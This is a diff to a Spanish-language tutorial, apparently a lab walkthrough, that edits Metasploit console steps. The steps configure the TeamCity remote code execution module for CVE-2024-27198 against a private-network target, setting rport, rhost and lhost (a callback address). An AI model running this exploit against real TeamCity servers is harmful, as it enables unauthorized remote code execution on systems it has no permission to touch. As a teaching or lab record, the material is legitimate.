@@ -120,8 +120,8 @@ Una vez instalado el agente, podemos ejecutar la línea de comandos mediante el 
 
 ```bash
 search cve:2024-27198
-exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > show options
-
+msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set rport 50000
+rport => 50000
 msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set rhost 10.128.148.36
 rhost => 10.128.148.36
 msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set lhost 192.168.128.160
